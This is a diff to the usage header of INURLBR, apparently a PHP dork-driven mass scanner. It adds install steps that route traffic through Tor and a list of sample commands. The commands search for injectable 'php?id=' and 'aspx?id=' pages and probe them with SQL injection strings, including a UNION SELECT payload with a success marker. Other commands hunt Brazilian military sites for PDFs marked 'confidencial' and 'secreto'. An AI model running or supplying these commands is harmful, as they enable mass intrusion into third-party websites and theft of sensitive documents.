@@ -16,12 +16,35 @@ SCANNER - INURLBR
  * php5-cli            LIB  
  * cURL support        enabled
  * cURL Information    7.24.0
- * Apache              2.4
  * allow_url_fopen     On
  * permission          Reading & Writing
  * User                root privilege, or is in the sudoers group
  * Operating system    LINUX
- * Proxy random        TOR        
+ * Proxy random        TOR    
+ * ----------------------------------------------------------
+ * [+] PERMISSION EXECUTION: chmod +x inurlbr.php
+ * [+] INSTALLING LIB CURL: sudo apt-get install php5-curl
+ * [+] INSTALLING LIB CLI: sudo apt-get install php5-cli
+ * [+] INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en
+ * ----------------------------------------------------------
+
+ * [+] COMMANDS SIMPLE
+ * ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?'0x27"  
+
+ * ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"
+
+ * ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"
+
+ * ./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
+
+ * ./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
+
+ * ./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'
+
+ * ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'0x27"
+
+ * ./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get "+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;" -a '::EXPLOIT-SUCESS::'
+
 
  * Opções disponíveis: 
 
